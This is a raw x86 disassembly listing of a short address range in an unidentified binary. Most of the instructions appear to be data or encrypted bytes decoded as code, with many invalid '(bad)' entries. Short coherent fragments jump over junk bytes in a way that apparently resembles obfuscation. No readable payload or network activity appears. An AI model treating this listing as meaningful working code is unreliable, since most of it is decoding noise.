  41346e:	pop    eax
  41346f:	pop    ecx
  413470:	dec    ebx
  413471:	sub    bh,BYTE PTR [ecx+ebx*8+0x5b0a9f9]
  413478:	xchg   ecx,eax
  413479:	mov    ebx,0x86347f71
  41347e:	and    al,0x77
  413480:	xor    al,0x1b
  413482:	mov    ebx,0x7d6a1a08
  413487:	mov    edi,DWORD PTR [edi]
  413489:	scas   al,BYTE PTR es:[edi]
  41348a:	sub    bl,BYTE PTR [esi+ecx*2+0x2c69d8c2]
  413491:	mov    ecx,0x2884b353
  413496:	mov    eax,ds:0x81aed050
  41349b:	jmp    esp
  41349d:	cs pop ebx
  41349f:	xchg   edx,eax
  4134a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4134a1:	(bad)  
  4134a2:	pop    ss
  4134a3:	icebp  
  4134a4:	imul   DWORD PTR [ecx]
  4134a6:	sbb    DWORD PTR [esi-0x95f8f5b],ebx
  4134ac:	int    0xed
  4134ae:	bound  ecx,QWORD PTR [ecx]
  4134b0:	jecxz  0x4134de
  4134b2:	lahf   
  4134b3:	push   ebp
  4134b4:	sbb    eax,0x1f7942de
  4134b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4134ba:	adc    ebp,DWORD PTR [edx]
  4134bc:	leave  
  4134bd:	cmp    cl,cl
  4134bf:	inc    edi
  4134c0:	pop    es
  4134c1:	ret    0x65f0
  4134c4:	sub    DWORD PTR [edx+edi*2],ecx
  4134c7:	loopne 0x413481
  4134c9:	scas   eax,DWORD PTR es:[edi]
  4134ca:	sub    ch,ch
  4134cc:	sub    al,0xab
  4134ce:	add    al,0x9e
  4134d0:	mov    ebp,0xe30df45b
  4134d5:	stos   DWORD PTR es:[edi],eax
  4134d6:	pop    eax
  4134d7:	mov    ds:0xf045b765,eax
  4134dc:	jcxz   0x413533
  4134df:	mov    eax,0x7a8c6622
  4134e4:	test   BYTE PTR [edi-0x7c0afc9e],0xde
  4134eb:	imul   ebp,DWORD PTR [esi],0xc4db86bf
  4134f1:	retf   0x1cd3
  4134f4:	sub    ebp,DWORD PTR [edx+0x62b5b3bb]
  4134fa:	es js  0x41350b
  4134fd:	add    eax,0xba8cad46
  413502:	push   ebx
  413503:	cmp    eax,0xfb468280
  413508:	out    0x47,al
  41350a:	into   
  41350b:	xor    DWORD PTR [esi-0x79],ebx
  41350e:	push   ebp
  41350f:	daa    
  413510:	inc    ebx
  413511:	test   eax,0x3a76c8ac
  413516:	add    al,0x1c
  413518:	or     ebx,ebx
  41351a:	jmp    FWORD PTR [esi]
  41351c:	outs   dx,BYTE PTR ds:[esi]
  41351d:	shr    eax,1
  41351f:	add    al,0xbb
  413521:	in     eax,dx
  413522:	lods   eax,DWORD PTR ds:[esi]
  413523:	jne    0x413514
  413525:	mov    ecx,0x5b1f5d53
  41352a:	gs and eax,0x24c18d2f
  413530:	push   edx
  413531:	pop    ebx
  413532:	jg     0x4134c2
  413534:	mov    BYTE PTR [eax],dh
  413536:	inc    edi
  413537:	sbb    al,0x85
  413539:	and    eax,0xe37367a2
  41353e:	cmp    ecx,DWORD PTR [esi-0x2f]
  413541:	xchg   esi,eax
  413542:	daa    
  413543:	in     eax,0x24
  413545:	(bad)  
  413546:	xor    eax,0xf1baf2f5
  41354b:	cmp    BYTE PTR [edx-0x76],ah
  41354e:	nop
  41354f:	aas    
  413550:	adc    al,0x31
  413552:	cmp    cl,bh
  413554:	retf   0xf12b
  413557:	les    dx,DWORD PTR [ebx+0x40]
  41355b:	jae    0x4134dd
  41355d:	jmp    0x4135d5
  41355f:	mov    ?,WORD PTR [ebx+0x14f4829d]
  413565:	xor    eax,0xe99f2cc
  41356a:	call   0x8ad50ca1
  41356f:	push   es
  413570:	stos   BYTE PTR es:[edi],al
  413571:	out    0x67,al
  413573:	mul    BYTE PTR [ebx-0x698a9f41]
  413579:	xchg   ebp,eax
  41357a:	repnz jmp 0x7cb1:0xc21ddc9b
  413582:	test   eax,0x677be0ce
  413587:	xor    BYTE PTR ds:0xad94baa5,dl
  41358d:	push   0x7c
  41358f:	les    ebx,FWORD PTR [ebp+eiz*8+0x24]
  413593:	test   eax,0x2785d96c
  413598:	mov    DWORD PTR [ebx+esi*2+0x364c85a],edx
  41359f:	xchg   edi,eax
  4135a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4135a1:	add    al,0x32
  4135a3:	pop    ss
  4135a4:	sbb    DWORD PTR [esi],0xffffff99
  4135a7:	mov    ch,0x46
  4135a9:	mov    esp,0xadb2ca31
  4135ae:	les    ebp,FWORD PTR [edx+0x21187166]
  4135b4:	ret    0xc3c0
  4135b7:	sub    DWORD PTR [esi-0x40ee42a4],eax
  4135bd:	sub    DWORD PTR [edi+0x1da46f87],esp
  4135c3:	in     al,0x66
  4135c5:	lock mov dl,0x4a
  4135c8:	xchg   ecx,eax
  4135c9:	jmp    0xccb5ad27
  4135ce:	cld    
  4135cf:	ficomp DWORD PTR [esi+0x1b]
  4135d2:	in     eax,0xa
  4135d4:	mov    edi,0xf6cb3378
  4135d9:	mov    ds:0x1969023d,al
  4135de:	pop    edx
  4135df:	(bad)  
  4135e0:	cwde   
  4135e1:	mov    ah,0xc5
  4135e3:	jbe    0x41358f
  4135e5:	or     DWORD PTR [eax-0x66],esi
  4135e8:	fs fsubr st(2),st
  4135eb:	and    BYTE PTR [ecx+edi*8-0xa],al
  4135ef:	cwde   
  4135f0:	inc    ebx
  4135f1:	xchg   esi,eax
  4135f2:	mov    al,BYTE PTR [esi+0x481b395c]
  4135f8:	sub    BYTE PTR [esi-0x5d66ff9a],0x6f
  4135ff:	fwait
  413600:	mov    BYTE PTR [edx+0x27],dl
  413603:	mov    cl,0xe8
  413605:	cmp    dl,al
  413607:	icebp  
  413608:	jb     0x413669
  41360a:	dec    ebp
  41360b:	repnz mov bl,0xf2
  41360e:	add    DWORD PTR [ecx],edx
  413610:	aad    0xcc
  413612:	mov    edx,0x6e543bbb
  413617:	jno    0x413617
  413619:	mov    BYTE PTR [ecx+0xe1b3183],bh
  41361f:	fs dec ebx
  413621:	push   0x4c
  413623:	dec    eax
  413624:	cmp    BYTE PTR [ecx],dh
  413626:	mov    al,0xa5
  413628:	or     ah,al
  41362a:	xchg   ebx,eax
  41362b:	jge    0x41362e
  41362d:	sub    eax,0x62e8c4f9
  413632:	std    
  413633:	or     DWORD PTR [ebx+0x646904fc],eax
  413639:	int3   
  41363a:	scas   al,BYTE PTR es:[edi]
  41363b:	mov    eax,DWORD PTR [ebp-0x48]
  41363e:	mov    ecx,DWORD PTR [ebp-0x44]
  413641:	shrd   eax,ecx,0x2
  413645:	shr    ecx,0x2
  413648:	mov    ecx,DWORD PTR [ebp-0x48]
  41364b:	mov    edx,DWORD PTR [ebp-0x44]
  41364e:	xor    eax,edi
  413650:	jmp    0x413bda
  413655:	jnp    0x413664
  413657:	les    edi,FWORD PTR [ebx+0x4c78b338]
  41365d:	jle    0x413689
  41365f:	nop
  413660:	outs   dx,BYTE PTR ds:[esi]
  413661:	sti    
  413662:	pop    ss
  413663:	cwde   
  413664:	mov    dl,0xdd
  413666:	cld    
  413667:	or     al,0x16
  413669:	cmp    eax,0xa8161604
  41366e:	fsubrp st(7),st
  413670:	fisttp QWORD PTR [edi]
  413672:	push   ecx
  413673:	mov    ebp,0x4ebc0ba6
  413678:	push   eax
  413679:	jle    0x41366f
  41367b:	xor    dl,BYTE PTR [esi+ebp*2+0x13]
  41367f:	adc    cl,BYTE PTR [esi]
  413681:	scas   al,BYTE PTR es:[edi]
  413682:	sbb    ebx,DWORD PTR [ebp+0x59]
  413685:	sbb    bh,cl
  413687:	fistp  WORD PTR [eax+eax*8-0x66ef4bb1]
  41368e:	cmp    DWORD PTR [edx+0x61abf7b1],edi
  413694:	rcl    BYTE PTR [edi+0x39],1
  413697:	rcr    BYTE PTR [esp+edx*8],0x67
  41369b:	clc    
  41369c:	sub    al,0x3f
  41369e:	call   0x7ddc:0x7235167f
  4136a5:	inc    esp
  4136a6:	push   0xffffff8c
  4136a8:	jns    0x4136df
  4136aa:	pop    ds
  4136ab:	in     al,dx
  4136ac:	ins    BYTE PTR es:[edi],dx
  4136ad:	adc    cl,BYTE PTR [esi+0x4b07c854]
  4136b3:	(bad)  
  4136b4:	mov    edx,0x947939c4
  4136b9:	mov    al,ds:0xcae19c07
  4136be:	int3   
  4136bf:	cdq    
  4136c0:	sbb    al,0x80
  4136c2:	iret   
  4136c3:	out    0x3b,eax
  4136c5:	int    0x38
  4136c7:	jae    0x413664
  4136c9:	jnp    0x413677
  4136cb:	and    edi,ecx
  4136cd:	mov    bl,0x9c
  4136cf:	popf   
  4136d0:	inc    ecx
  4136d1:	push   cs
  4136d2:	push   0xffffffb5
  4136d4:	in     al,0x4f
  4136d6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4136d7:	jno    0x41371b
  4136d9:	add    eax,0x513fa482
  4136de:	enter  0x7837,0x30
  4136e2:	jo     0x413696
  4136e4:	out    0xc8,eax
  4136e6:	int3   
  4136e7:	stc    
  4136e8:	push   es
  4136e9:	in     eax,dx
  4136ea:	fs inc ebp
  4136ec:	repz mov al,0x3c
  4136ef:	add    eax,DWORD PTR [edx+0x27ed86b5]
  4136f5:	addr16 sub ah,al
  4136f8:	push   cs
  4136f9:	add    cl,BYTE PTR [edx-0x6a3377ca]
  4136ff:	pop    esi
  413700:	test   eax,0xa4cf5ef4
  413705:	pop    ebp
  413706:	or     bh,BYTE PTR [ecx+0x67]
  413709:	adc    DWORD PTR [esi+0x9],ebx
  41370c:	mov    ebp,0x508673d7
  413711:	inc    eax
  413712:	cli    
  413713:	or     al,0xc3
  413715:	out    dx,al
  413716:	adc    DWORD PTR [ebx-0x36],0x42bc92bd
  41371d:	leave  
  41371e:	pusha  
  41371f:	in     eax,0x20
  413721:	mov    esi,0x81d65955
  413726:	xor    ch,BYTE PTR [esi]
  413728:	outs   dx,BYTE PTR ds:[esi]
  413729:	ret    0x866c
  41372c:	dec    esp
  41372d:	jmp    0xc8b377c6
  413732:	and    BYTE PTR [edi],cl
  413734:	xchg   esi,eax
  413735:	scas   eax,DWORD PTR es:[edi]
  413736:	aaa    
  413737:	inc    ebp
  413738:	sar    DWORD PTR [esi],1
  41373a:	mov    DWORD PTR [edx],eax
  41373c:	xchg   DWORD PTR [esi+0x2de87e86],eax
  413742:	dec    ecx
  413743:	cmp    BYTE PTR [edx+0x55369134],al
  413749:	(bad)  
  41374a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41374b:	inc    ecx
  41374c:	sub    eax,0x857db908
  413751:	jmp    0x96a7:0x7962b1aa
  413758:	loope  0x4137bd
  41375a:	dec    esi
  41375b:	and    al,0x2
  41375d:	xchg   edx,eax
  41375e:	fild   DWORD PTR [esp+esi*1]
  413761:	jge    0x4137c8
  413763:	stos   DWORD PTR es:[edi],eax
  413764:	inc    edx
  413765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413766:	call   0x253a70e6
  41376b:	arpl   WORD PTR [ebx+0x30],bp
  41376e:	xor    DWORD PTR cs:[edx+0xf81d7f0],ebx
  413775:	jle    0x4137e0
  413777:	adc    eax,0x1eb3d1c1
  41377c:	mov    bl,0x8c
  41377e:	jecxz  0x413713
  413780:	mov    cs,WORD PTR [eax-0x3c]
  413783:	xchg   esp,eax
  413784:	add    BYTE PTR [ebp+0x78],dh
  413787:	xchg   ecx,eax
  413788:	sub    DWORD PTR [esi+ebx*2+0x4],edx
  41378c:	inc    esp
  41378d:	sub    al,BYTE PTR es:[ecx]
  413790:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  413792:	push   edi
  413793:	repnz adc al,0x30
  413796:	add    eax,0x9405c96d
  41379b:	scas   al,BYTE PTR es:[edi]
  41379c:	push   ebp
  41379d:	sahf   
  41379e:	mov    ds:0xf9d2c74,al
  4137a3:	(bad)  
  4137a4:	dec    ebx
  4137a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137a6:	xchg   esi,eax
  4137a7:	push   ecx
  4137a8:	data16 repz cmp cl,bl
  4137ac:	cwde   
  4137ad:	fcom   DWORD PTR [edx]
  4137af:	es jno 0x41373e
  4137b2:	xchg   edx,eax
  4137b3:	push   ebx
  4137b4:	inc    esp
  4137b5:	xchg   edx,eax
  4137b6:	(bad)  
  4137b7:	jb     0x41379d
  4137b9:	push   ebp
  4137ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4137bb:	add    al,0xc5
  4137bd:	cwde   
  4137be:	in     eax,0x5d
  4137c0:	sar    BYTE PTR [esi+0x74],0x2f
  4137c4:	mov    cl,BYTE PTR [esi]
  4137c6:	sbb    BYTE PTR [esi],cl
  4137c8:	sbb    dl,ah
  4137ca:	(bad)  [ebx]
  4137cc:	or     DWORD PTR [ebx+edx*1+0x20],ebx
  4137d0:	inc    ebp
  4137d1:	adc    BYTE PTR [ebx-0x49c08910],cl
  4137d7:	pop    edx
  4137d8:	sahf   
  4137d9:	inc    edi
  4137da:	out    0x45,eax
  4137dc:	(bad)  
  4137dd:	aam    0x37
  4137df:	jnp    0x413829
  4137e1:	xor    dl,BYTE PTR [edx]
  4137e3:	ins    DWORD PTR es:[edi],dx
  4137e4:	or     BYTE PTR [ebp+0x16b50cad],al
  4137ea:	icebp  
  4137eb:	hlt    
  4137ec:	test   al,0xfc
  4137ee:	imul   ebp,DWORD PTR [ebx+eax*2+0x1095ef7b],0x42
  4137f6:	repz and DWORD PTR [ecx],ebp
  4137f9:	retf   0xfaf7
  4137fc:	inc    esi
  4137fd:	and    ecx,DWORD PTR [edi-0xd]
  413800:	in     al,0xd2
  413802:	cmp    eax,ecx
  413804:	push   ebx
  413805:	add    al,0xbc
  413807:	in     eax,dx
  413808:	or     edi,DWORD PTR [edi+0x7b52642e]
  41380e:	sbb    al,0xc5
  413810:	out    dx,eax
  413811:	ss add ebx,ecx
  413814:	dec    edx
  413815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413816:	shl    DWORD PTR [edx+0x5b116824],1
  41381c:	in     eax,dx
  41381d:	js     0x413851
  41381f:	(bad)  
  413821:	das    
  413822:	cmp    eax,DWORD PTR [eax-0x20]
  413825:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413826:	fcmovne st,st(4)
  413828:	call   0x6a9a8709
  41382d:	ret    0x4263
  413830:	fadd   DWORD PTR [ebp-0x7b]
  413833:	scas   eax,DWORD PTR es:[edi]
  413834:	hlt    
  413835:	sbb    DWORD PTR [edi+0x7603c1b9],0x2c
  41383c:	fsub   QWORD PTR [ebp+0x63]
  41383f:	and    esi,esi
  413841:	imul   eax,DWORD PTR [eax],0xffffff83
  413844:	adc    DWORD PTR [ecx-0xc3c86a8],esi
  41384a:	pop    esi
  41384b:	mov    ah,0x64
  41384d:	fisttp QWORD PTR [edi]
  41384f:	pushf  
  413850:	jae    0x4137d4
  413852:	mov    esi,0x7ed144a7
  413857:	call   0xd749f0b4
  41385c:	int    0xd3
  41385e:	add    ecx,DWORD PTR [edi-0x14806633]
  413864:	ficom  WORD PTR [esi]
  413866:	cmc    
  413867:	adc    dh,BYTE PTR [edi+ebp*8-0x4eb8e3ff]
  41386e:	(bad)  
  41386f:	push   esp
  413870:	data16 (bad) [ebp+edx*8+0x5ff9426a]
  413878:	pushf  
  413879:	jns    0x41380d
  41387b:	xlat   BYTE PTR ds:[ebx]
  41387c:	mov    BYTE PTR cs:[ebx],0x30
  413880:	out    0xb7,eax
  413882:	ds in  al,dx
  413884:	cmp    al,0x71
  413886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413887:	nop
  413888:	fcmovnbe st,st(4)
  41388a:	mov    edi,0xfade200a
  41388f:	ret    0x8980
  413892:	ror    DWORD PTR [eax],1
  413894:	aaa    
  413895:	inc    ebx
  413896:	stos   DWORD PTR es:[edi],eax
  413897:	push   es
  413898:	cmp    ebx,edi
  41389a:	jne    0x41384b
  41389c:	gs inc esi
  41389e:	and    BYTE PTR [eax+0x62],dl
  4138a1:	in     al,0x73
  4138a3:	adc    ah,dl
  4138a5:	inc    esi
  4138a6:	dec    ebx
  4138a7:	cmp    eax,0x61f1f754
  4138ac:	ins    DWORD PTR es:[edi],dx
  4138ad:	mov    WORD PTR [esi],?
  4138af:	mov    al,BYTE PTR [ecx-0x7fdb0741]
  4138b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4138b6:	or     eax,DWORD PTR [ecx-0x3d5e5dcc]
  4138bc:	mov    ecx,0x6a0cd96d
  4138c1:	add    dl,BYTE PTR [ebx+0x4]
  4138c4:	xchg   ebx,eax
  4138c5:	sub    al,ch
  4138c7:	cmp    eax,0x9ddcbc7c
  4138cc:	fdivr  st,st(3)
  4138ce:	jg     0x4138a5
  4138d0:	lahf   
  4138d1:	shr    eax,0xc3
  4138d4:	or     dl,BYTE PTR [edi]
  4138d6:	add    DWORD PTR [ecx-0x18009abc],esi
  4138dc:	or     eax,DWORD PTR [esi-0x4a0ed040]
  4138e2:	lods   eax,DWORD PTR ds:[esi]
  4138e3:	fcomp  QWORD PTR [ecx]
  4138e5:	ret    0xad3f
  4138e8:	cmc    
  4138e9:	push   ss
  4138ea:	cdq    
  4138eb:	fwait
  4138ec:	push   edi
  4138ed:	outs   dx,DWORD PTR ds:[esi]
  4138ee:	frstor [eax+0x2cdea1e]
  4138f4:	cmp    ah,BYTE PTR [esi+0x57a2f5bb]
  4138fa:	jne    0x413967
  4138fc:	scas   eax,DWORD PTR es:[edi]
  4138fd:	in     al,dx
  4138fe:	mov    eax,0xa6da6b27
  413903:	xor    eax,0xff8dfc34
  413908:	push   edx
  413909:	pusha  
  41390a:	xor    ah,BYTE PTR [ecx+0x1d]
  41390d:	cdq    
  41390e:	icebp  
  41390f:	(bad)  
  413910:	push   ebx
  413911:	add    al,0x9f
  413913:	inc    edi
  413914:	cwde   
  413915:	cdq    
  413916:	adc    ecx,DWORD PTR [edi+0x270ce9ad]
  41391c:	ss pop esi
  41391e:	ds imul ebp,edi,0x59772ecb
  413925:	shl    BYTE PTR [ecx+0x5413c278],0x89
  41392c:	xor    DWORD PTR [edi+edx*1+0x5d3cc455],ebp
  413933:	jo     0x4138d1
  413935:	jmp    FWORD PTR [esi]
  413937:	into   
  413938:	xor    bl,BYTE PTR [ebp+eiz*4-0x1f]
  41393c:	popf   
  41393d:	in     al,dx
  41393e:	cdq    
  41393f:	xchg   ebx,eax
  413940:	jg     0x4139b5
  413942:	and    ebp,edx
  413944:	add    DWORD PTR [ebx-0x350dbb54],eax
  41394a:	jbe    0x4138e6
  41394c:	imul   edi,DWORD PTR [esi+0x112ad4d0],0x4191272a
  413956:	or     al,0x5
  413958:	es aad 0x1d
  41395b:	or     eax,0x8b5d8d21
  413960:	jae    0x413914
  413962:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413963:	xor    eax,0xa45638fa
  413968:	mov    bl,0x26
  41396a:	sbb    al,ch
  41396c:	jae    0x413921
  41396e:	cwde   
  41396f:	and    eax,0xa9a6c44
  413974:	pop    es
  413975:	xchg   esp,eax
  413976:	mov    ss,WORD PTR [edx+edx*2-0x72]
  41397a:	pusha  
  41397b:	sbb    ecx,edi
  41397d:	xor    eax,0x7498be6f
  413982:	sbb    eax,DWORD PTR [edi]
  413984:	icebp  
  413985:	or     edi,DWORD PTR [ecx]
  413987:	test   eax,0xdd5d3586
  41398c:	inc    eax
  41398d:	sub    esi,DWORD PTR [esi-0x70d52e6a]
  413993:	jae    0x4139c4
  413995:	sar    BYTE PTR [edx],0x9e
  413998:	jecxz  0x413963
  41399a:	test   eax,0xce90fe5c
  41399f:	test   eax,0x837281da
  4139a4:	sbb    eax,DWORD PTR [edx]
  4139a6:	mov    ds:0xfe44d5f9,eax
  4139ab:	xlat   BYTE PTR ds:[ebx]
  4139ac:	lahf   
  4139ad:	add    al,0x89
  4139af:	cmp    dh,ch
  4139b1:	lock stc 
  4139b3:	int3   
  4139b4:	pop    esi
  4139b5:	xchg   ecx,eax
  4139b6:	and    bl,BYTE PTR [ecx+0x5c06e85a]
  4139bc:	sub    eax,0x7322efb7
  4139c1:	or     cl,cl
  4139c3:	jns    0x413a21
  4139c5:	add    eax,0x9f8cdf9a
  4139ca:	test   BYTE PTR [edx+0x3d],ah
  4139cd:	inc    eax
  4139ce:	(bad)  
  4139cf:	fnsave [edi+esi*8-0x40]
  4139d3:	push   edx
  4139d4:	loop   0x413a19
  4139d6:	mov    ah,0x83
  4139d8:	(bad)  
  4139d9:	sub    BYTE PTR [ecx+0x7cc64dd5],ch
  4139df:	cmp    dl,BYTE PTR ds:0x78794ae4
  4139e5:	(bad)  
  4139e6:	les    esi,FWORD PTR [eax]
  4139e8:	(bad)  
  4139e9:	retf   
  4139ea:	ror    dh,1
  4139ec:	push   0x5cc2d49a
  4139f1:	ret    0x289c
  4139f4:	nop
  4139f5:	adc    DWORD PTR ds:0xf69e15b8,0xdfa6c7bd
  4139ff:	cmp    bl,BYTE PTR [edx-0x7a]
  413a02:	add    al,0x42
  413a04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413a05:	dec    eax
  413a06:	ja     0x413a6a
  413a08:	fbld   TBYTE PTR [ecx+0x13]
  413a0b:	les    esi,FWORD PTR [ecx-0x44]
  413a0e:	(bad)  
  413a10:	std    
  413a11:	ja     0x413a8e
  413a13:	jl     0x4139cb
  413a15:	mov    ebp,ebx
  413a17:	in     al,dx
  413a18:	rol    BYTE PTR [ecx],0x9e
  413a1b:	sar    DWORD PTR [ebx+edx*2],0x7a
  413a1f:	mov    cl,0x9d
  413a21:	cld    
  413a22:	fldcw  WORD PTR [ebx]
  413a24:	push   0x37794599
  413a29:	dec    ebp
  413a2a:	repz es xchg ebx,eax
  413a2d:	and    DWORD PTR [eax-0x64],esi
  413a30:	mov    edx,0x9374476c
  413a35:	dec    DWORD PTR [edi]
  413a37:	fild   QWORD PTR [esi-0x42]
  413a3a:	ds inc eax
  413a3c:	sbb    al,0xf0
  413a3e:	dec    edi
  413a3f:	mov    ds:0xb39be821,eax
  413a44:	aas    
  413a45:	int3   
  413a46:	in     al,0x74
  413a48:	cmp    ah,ah
  413a4a:	sbb    eax,0xfb5445fe
  413a4f:	jl     0x413a20
  413a51:	jbe    0x4139fe
  413a53:	mov    BYTE PTR ds:0x3fa68419,cl
  413a59:	repz adc DWORD PTR [edi],0xe5382b0f
  413a60:	cmp    eax,0xffc6c813
  413a65:	pop    esi
  413a66:	fwait
  413a67:	inc    esi
  413a68:	int3   
  413a69:	mov    bh,0x83
  413a6b:	stc    
  413a6c:	adc    esp,ecx
  413a6e:	add    al,0xfb
  413a70:	xchg   edx,eax
  413a71:	pop    esp
  413a72:	cli    
  413a73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a74:	in     eax,dx
  413a75:	sub    DWORD PTR [edi+0x3d],esi
  413a78:	xor    DWORD PTR [edx+0x5bec625b],ecx
  413a7e:	test   DWORD PTR [esi-0x4ac0f376],esp
  413a84:	data16 jecxz 0x413a99
  413a87:	ins    BYTE PTR es:[edi],dx
  413a88:	loopne 0x413a5a
  413a8a:	stc    
  413a8b:	dec    edi
  413a8c:	sub    eax,edi
  413a8e:	aas    
  413a8f:	mov    cl,0x56
  413a91:	jae    0x413ac4
  413a93:	fistp  QWORD PTR [ebx+0x2fe5e4d1]
  413a99:	outs   dx,DWORD PTR ds:[esi]
  413a9a:	mov    ecx,0xb0ebcf55
  413a9f:	pop    ss
  413aa0:	sahf   
  413aa1:	ds dec edx
  413aa3:	mov    ebx,0xcc335900
  413aa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413aa9:	adc    eax,DWORD PTR [ecx-0x2d]
  413aac:	dec    edi
  413aad:	scas   al,BYTE PTR es:[edi]
  413aae:	xor    ebx,DWORD PTR [esi]
  413ab0:	retf   0xd72a
  413ab3:	test   al,0x33
  413ab5:	adc    esi,DWORD PTR [ebx+0x15ce7425]
  413abb:	(bad)  
  413abd:	sub    eax,0x15e11c0e
  413ac2:	(bad)  
  413ac3:	add    DWORD PTR [eax-0x5a175b5c],eax
  413ac9:	mov    ds,WORD PTR [edx-0x127a3fb3]
  413acf:	fsubr  st,st(5)
  413ad1:	das    
  413ad2:	aas    
  413ad3:	outs   dx,DWORD PTR ds:[esi]
  413ad4:	pop    edx
  413ad6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ad7:	or     esi,DWORD PTR [edx]
  413ad9:	xchg   edi,ecx
  413adb:	cmp    BYTE PTR [edi-0x27],cl
  413ade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413adf:	das    
  413ae0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ae1:	cmp    eax,0x51afde56
  413ae6:	mov    edi,0x3f1abedd
  413aeb:	into   
  413aec:	pop    es
  413aed:	iret   
  413aee:	mov    ebp,0x5a4327ca
  413af3:	pop    esp
  413af4:	mov    ds:0xd4df55ed,eax
  413af9:	out    0xe2,eax
  413afb:	mov    ecx,DWORD PTR ds:0xdd113765
  413b01:	mov    eax,0xc8d7f9ec
  413b06:	aad    0x4b
  413b08:	cmc    
  413b09:	out    0xad,eax
  413b0b:	sub    DWORD PTR [edx+0x4c95c74],eax
  413b11:	mov    edx,0x3ea0f5c1
  413b16:	cli    
  413b17:	inc    ebx
  413b18:	in     eax,0xdc
  413b1a:	xor    eax,0xffffffc3
  413b1d:	ins    DWORD PTR es:[edi],dx
  413b1e:	pop    es
  413b1f:	jns    0x413ac0
  413b21:	add    al,BYTE PTR [esi+0x16569d9f]
  413b27:	mov    ecx,0xcd16bea0
  413b2c:	neg    DWORD PTR [ebx+0x7ab68df7]
  413b32:	call   0x72e9b760
  413b37:	pop    ebx
  413b38:	inc    eax
  413b39:	les    edi,FWORD PTR [edx+0xd7525d0]
  413b3f:	cmp    BYTE PTR cs:[eax+0x4866c107],ch
  413b46:	aad    0xa4
  413b48:	ds out 0x7c,al
  413b4b:	push   eax
  413b4c:	je     0x413b89
  413b4e:	xchg   esp,eax
  413b4f:	retf   0xea40
  413b52:	icebp  
  413b53:	cdq    
  413b54:	fdiv   QWORD PTR [edi+0x4d]
  413b57:	mov    ds:0x68a89ec6,eax
  413b5c:	pop    ebp
  413b5d:	sbb    dh,bl
  413b5f:	sbb    ebp,DWORD PTR [ecx]
  413b61:	(bad)  
  413b63:	mov    ecx,DWORD PTR [esi-0x32]
  413b66:	(bad)  
  413b67:	popf   
  413b68:	adc    eax,0x9a80d87a
  413b6d:	cmp    al,ch
  413b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b70:	rol    DWORD PTR [ebx+0x2e],1
  413b73:	fst    st(5)
  413b75:	cmp    DWORD PTR [esi+edi*1],0x79
  413b79:	ror    BYTE PTR [edi],1
  413b7b:	adc    ch,bh
  413b7d:	jmp    0x413b07
  413b7f:	dec    esp
  413b80:	fmul   QWORD PTR [edi]
  413b82:	push   ss
  413b83:	mov    ds:0x2c185dd,eax
  413b88:	mov    bl,0xaa
  413b8a:	jg     0x413b64
  413b8c:	mov    dh,0xab
  413b8e:	inc    ebx
  413b8f:	jmp    0x413b89
  413b91:	or     DWORD PTR [ebp+0x59725eef],0x49
  413b98:	sub    ecx,0x9
  413b9b:	add    DWORD PTR [esi-0x34],esp
  413b9e:	cmp    ebx,ebp
  413ba0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ba1:	lahf   
  413ba2:	push   es
  413ba3:	js     0x413bbf
  413ba5:	sbb    eax,DWORD PTR ds:0x84a3d240
  413bab:	jmp    0x8224d163
  413bb0:	lahf   
  413bb1:	or     BYTE PTR [ebx-0x2de9154d],0x83
  413bb8:	mov    ecx,0x601122bb
  413bbd:	int    0xd1
  413bbf:	and    ah,0x53
  413bc2:	push   0x5eb48fc3
  413bc7:	or     edx,DWORD PTR [edx+0x67]
  413bca:	fsubr  DWORD PTR [ebp-0x24]
  413bcd:	pop    edi
  413bce:	xor    DWORD PTR [edx+0x46],esp
  413bd1:	cmc    
  413bd2:	in     al,dx
  413bd3:	aaa    
  413bd4:	loopne 0x413bde
  413bd6:	std    
  413bd7:	add    DWORD PTR [ecx+edx*1],edi
  413bda:	shl    ecx,0x1e
  413bdd:	xor    edx,edx
  413bdf:	or     eax,edx
  413be1:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  413be5:	mov    eax,DWORD PTR [ebp+0x14]
  413be8:	add    BYTE PTR [eax],cl
  413bea:	mov    eax,DWORD PTR [ebp-0x38]
  413bed:	mov    ecx,DWORD PTR [ebp-0x34]
  413bf0:	shrd   eax,ecx,0x2
  413bf4:	shr    ecx,0x2
  413bf7:	mov    ecx,DWORD PTR [ebp-0x38]
  413bfa:	mov    edx,DWORD PTR [ebp-0x34]
  413bfd:	xor    eax,edi
  413bff:	shl    ecx,0x1e
  413c02:	mov    ecx,DWORD PTR [ebp-0x38]
  413c05:	jmp    0x41418f
  413c0a:	sahf   
  413c0b:	(bad)  
  413c0c:	push   cs
  413c0d:	sub    esi,ebp
  413c0f:	sbb    BYTE PTR [eax],bl
  413c11:	inc    eax
  413c12:	adc    al,0xc8
  413c14:	sub    BYTE PTR [esi-0x57ebd1a1],0xb
  413c1b:	repnz or al,0x16
  413c1e:	cmp    eax,0x38161604
  413c23:	jns    0x413c11
  413c25:	pop    ds
  413c26:	jnp    0x413bf4
  413c28:	call   0x181e:0x5d1d0579
  413c2f:	bound  esp,QWORD PTR [eax-0x23]
  413c32:	mov    ebp,es
  413c34:	iret   
  413c35:	pop    ecx
  413c36:	repnz lea edi,[ecx-0x51]
